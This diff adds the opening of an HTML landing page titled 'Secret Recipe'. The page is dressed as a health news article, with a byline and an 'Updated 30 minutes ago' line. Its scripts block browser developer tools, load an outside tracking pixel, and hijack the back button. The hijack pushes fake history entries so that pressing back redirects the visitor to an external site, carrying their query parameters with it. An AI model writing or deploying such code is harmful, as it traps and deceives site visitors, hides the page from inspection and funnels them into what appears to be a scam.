@@ -1,4 +1,50 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <script disable-devtool-auto src="dev-tools.js"></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Secret Recipe</title>
+    <link rel="stylesheet" type="text/css" href="css/personalizado.css">
+    <link rel="stylesheet" type="text/css" href="css/personalizado_02.css">
+    <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
+    <link rel="stylesheet" type="text/css" href="css/style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Jost:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+    <style type="text/css">
+      .esconder {
+        display: none;
+      }
+    </style>
+    <!-- Meta Pixel Code -->
+    <script>
+  window.pixelId = "6706fc1ad0fccb445fee2330";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
 </script>
+    <!-- End Meta Pixel Code -->
+  </head>
+  <body>
+    <script>
+      // Link back redirect
+      var back_redirect_back_link = `https://be-happy-healthy.site/backingle1/${window.location.search}`;
+      // Não altere daqui para baixo
+      history.pushState({}, "", location.href);
+      history.pushState({}, "", location.href);
+      window.addEventListener('popstate', function(event) {
+        if (event.state) {
+          setTimeout(function() {
+            location.href = back_redirect_back_link;
+          }, 1);
+        }
+      }, false);
+    </script>
     <main id="container">
       <header class="red-header">
         <!-- Título Header -->
@@ -8,3 +54,9 @@
       <!-- Letreiro -->
       <marquee>Daily updates on wellness and health - Daily updates on wellness and health - Daily updates on wellness and health - Daily updates on wellness and health</marquee>
       <section class="principal">
+        <!-- Título principal -->
+        <h1 style="font-weight: 500 !important;display: none;"><span style="color: #9c0505;">URGENT:</span>  <span style="color: #9c0505;"></span>  </h1>
+        <p class="txt_info_noticia">
+          <b>By Richard Johnson</b>
+          <br>Updated 30 minutes ago - <span class="data_atual"></span>
+        </p>
